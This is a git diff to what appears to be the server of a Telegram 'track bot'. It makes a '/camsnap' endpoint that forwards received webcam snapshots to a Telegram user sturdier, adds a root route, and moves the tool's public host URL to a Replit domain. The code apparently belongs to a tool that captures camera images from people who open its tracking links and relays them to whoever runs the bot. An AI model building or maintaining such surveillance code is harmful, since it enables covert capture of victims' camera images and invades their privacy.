@@ -20,6 +20,11 @@ app.set("view engine", "ejs");
 // Serve static files (if needed)
 app.use(express.static("public"));
 
+// Add root route handler
+app.get('/', (req, res) => {
+  res.send('Server is running!');
+});
+
 // 📌 Start Command - Ask to Join Channel
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
@@ -244,12 +249,20 @@ app.post("/camsnap", (req, res) => {
         const info = { filename: "camsnap.png", contentType: 'image/png' };
 
         try {
-            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
+            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info)
+                .then(() => {
+                    res.send("Done");
+                })
+                .catch((error) => {
+                    console.error("Error sending photo:", error);
+                    res.status(500).send("Error");
+                });
         } catch (error) {
-            console.error("Error sending photo:", error);
+            console.error("Error processing photo:", error);
+            res.status(500).send("Error");
         }
-
-        res.send("Done");
+    } else {
+        res.status(400).send("Missing data");
     }
 });
 
@@ -310,5 +323,5 @@ app.listen(PORT, '0.0.0.0', () => {
 });
 
 const channelUsername = "@technicalwhitehat";
-const hostURL = "https://twh-track-bot.onrender.com";
+const hostURL = "https://2674a208-2165-406c-8966-f89095e4efec-00-2drsz49mwxcca.pike.replit.dev/";
 const use1pt = false;
